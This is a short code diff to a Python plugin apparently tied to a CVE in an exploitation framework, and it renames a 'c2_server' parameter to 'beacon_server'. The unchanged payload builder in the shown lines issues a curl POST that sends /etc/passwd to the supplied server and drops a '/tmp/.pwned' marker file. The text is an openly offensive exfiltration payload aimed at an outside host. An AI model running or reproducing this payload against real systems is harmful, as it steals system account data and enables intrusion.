@@ -20,9 +20,9 @@ class CVE202626030Plugin(CVEPlugin):
             enabled=True,
         )
 
-    def craft_payload(self, c2_server: str, **kwargs) -> str:
+    def craft_payload(self, beacon_server: str, **kwargs) -> str:
         cmd = (
-            f"curl -X POST http://{c2_server}/beacon "
+            f"curl -X POST http://{beacon_server}/beacon "
             '-H "Content-Type: application/json" '
             '-d "@/etc/passwd" && echo pwned > /tmp/.pwned'
         )
